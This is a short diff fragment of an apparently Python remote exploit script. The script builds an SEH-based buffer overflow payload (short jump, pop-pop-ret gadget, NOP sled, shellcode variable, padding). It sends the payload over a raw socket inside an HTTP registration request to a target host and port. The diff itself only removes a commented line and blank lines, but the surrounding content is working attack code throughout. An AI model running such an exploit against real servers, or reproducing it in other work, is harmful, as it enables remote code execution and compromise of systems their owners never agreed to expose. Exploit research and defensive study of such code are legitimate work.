@@ -86,7 +86,6 @@ payload += '\xEB\x16\xCC\xCC' # A hop ahead, instead of backwards
 payload += pop_pop_ret
 payload += 'B' * 12
 payload += 'CCCC'
-#payload += 'Z' * (702 - len(buf))
 payload += '\x90\x90\x90\x90'
 payload += buf
 payload += 'Z' * (702 - len(buf) - 4)
@@ -96,14 +95,12 @@ data+="Password=a&"
 data+="Password1=&"
 data+="Sex=2&Email=%40&Icon=0.gif&Resume=&cw=1&RoomID=%3c%21--%24RoomID--%3e&RepUserName=%3c%21--%24UserName--%3e&submit1=Register"
 
-
 exploit = ""
 exploit += url
 exploit += header_1
 exploit += header_2
 exploit += header_3
 exploit += data
-
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
